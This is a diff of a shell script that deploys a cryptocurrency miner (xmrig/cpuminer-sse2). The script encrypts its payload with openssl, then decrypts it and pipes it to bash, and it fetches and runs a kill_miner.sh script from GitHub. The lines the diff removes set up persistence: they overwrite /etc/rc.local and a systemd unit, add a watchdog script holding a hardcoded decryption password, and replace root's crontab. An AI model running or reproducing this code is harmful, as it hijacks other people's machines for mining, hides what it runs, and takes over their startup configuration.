@@ -38,52 +38,8 @@ openssl enc -aes-256-cbc -salt -pbkdf2 -in danielluis1921.sh -out danielluis1922
 rm -fv danielluis1921.sh
 chmod +x /root/danielluis1922.sh
 
-#sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof xmrig) > /dev/null 2>&1 &" danielluis1922.sh
-
-cat /dev/null > /etc/rc.local
-cp /root/danielluis1922.sh /etc/rc.local
-chmod +x /etc/rc.local
-
-cat /dev/null > /etc/systemd/system/rc-local.service
-
-cat >>/etc/systemd/system/rc-local.service <<EOF
-[Unit]
-Description=/etc/rc.local Support
-ConditionPathExists=/etc/rc.local
-
-[Service]
-ExecStart=/etc/rc.local start
-TimeoutSec=0
-StandardOutput=tty
-RemainAfterExit=yes
-SysVStartPriority=99
-
-[Install]
-WantedBy=multi-user.target 
-EOF
-
-cat /dev/null > /root/checkXMRIG.sh
-cat >>/root/checkXMRIG.sh <<EOF
-#!/bin/bash
-if pgrep cpuminer-sse2 >/dev/null
-then
-  echo "cpuminer-sse2 is running."
-else
-  echo "cpuminer-sse2 isn't running"
-  bash kill_miner.sh
-  sleep 3
-  openssl enc -d -aes-256-cbc -in danielluis1922.sh -pass pass:danielchau@123# | bash
-fi
-EOF
-chmod +x /root/checkXMRIG.sh
-
-cat /dev/null > /var/spool/cron/crontabs/root
-cat >>/var/spool/cron/crontabs/root<<EOF
-*/10 * * * * /root/checkXMRIG.sh > /root/checkxmrig.log
-EOF
-
 wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
-chmod 777 /root/kill_miner.sh
+chmod +x /root/kill_miner.sh
 ./kill_miner.sh
 sleep 3
 openssl enc -d -aes-256-cbc -pbkdf2 -in danielluis1922.sh -k $password | bash
